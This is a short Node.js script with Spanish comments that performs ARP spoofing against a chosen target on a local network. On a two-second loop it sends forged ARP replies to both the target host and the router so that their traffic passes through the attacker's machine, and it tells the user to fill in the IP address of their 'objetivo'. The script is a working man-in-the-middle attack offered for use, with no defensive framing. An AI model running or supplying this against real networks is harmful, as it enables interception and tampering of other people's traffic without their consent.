import { ArpSpoof, NetworkUtils } from 'arputils';

const interfaz = 'en0'; // interfaz de red
const targetIp = '192.168.0.103'; // Cambia esto a la IP de tu objetivo
const routerIp = '192.168.0.1'; 
const Mac = 'f4:d4:88:81:99:e3'; 

// Función de ARP Spoofing
const execArp = async () => {

  const arpSpoof = new ArpSpoof(interfaz);

  setInterval(async () => {
    // await arpSpoof.poison(targetIp, routerIp);
    // await arpSpoof.poison(routerIp, targetIp);
    console.log(`Sending ${Mac} to ${targetIp} as ${routerIp}`)
    await arpSpoof.sendRawPacket({
      'op': 'reply',
      'src_ip': targetIp,
      'dst_ip': routerIp,
      'dst_mac': Mac
    });
    console.log(`Sending ${Mac} to ${routerIp} as ${targetIp}`)
    await arpSpoof.sendRawPacket({
      'op': 'reply',
      'src_ip': routerIp,
      'dst_ip': targetIp,
      'dst_mac': Mac
    });
  }, 2 * 1000);

  // const defaultInterface = await NetworkUtils.getDefaultInterface();
  // console.log('defaultInterface :>> ', defaultInterface);
  // const gatewayIp = await NetworkUtils.getGatewayIp(defaultInterface.name);
  // console.log('gatewayIp :>> ', gatewayIp);

}

// Ejecutamos ARP Spoofing
execArp();

// npm install pcap
// sudo apt install libpcap-dev git
// npm i https://github.com/mranney/node_pcap.git